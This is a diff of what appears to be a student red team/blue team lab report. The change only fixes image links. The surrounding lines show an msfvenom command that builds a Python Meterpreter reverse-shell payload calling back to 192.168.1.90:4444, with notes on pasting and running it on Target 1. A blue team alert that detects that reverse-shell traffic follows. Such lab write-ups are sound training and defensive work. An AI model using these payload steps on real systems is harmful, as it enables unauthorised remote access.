@@ -247,7 +247,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - Crafted payload with msfvenom:
       - `msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw -o /tmp/pythonwhoo.py`
       
-      ![pythonwhoo](P3_Images/P3T1_msfvenom_steven)
+      ![pythonwhoo](P3_Images/P3T1_msfvenom_steven.png)
     - The upload command did not work inside the Meterpreter session already in existence, so using nano, I cut and pasted the contents of the payload into a new file created on Target 1.  
 
     - In the existing Meterpreter session, executed the payload:
@@ -414,7 +414,7 @@ Listener Alert is implemented as follows:
 - Reliability: High reliability.  This alert fired during all Red Team activity utilizing a Reverse Shell with the targeted system directing traffic to 192.168.1.90:4444.  However, if the attack set the listener outside this port range, the alert would not activate.
 
 ![Listener_alert](P3_Images/P3BT_listener_alert.png)
-![Listener_graph](P3_Image/P3BT_listener_alert_search.png)
+![Listener_graph](P3_Images/P3BT_listener_alert_search.png)
 
 **CPU Usage Monitor Alert**
 
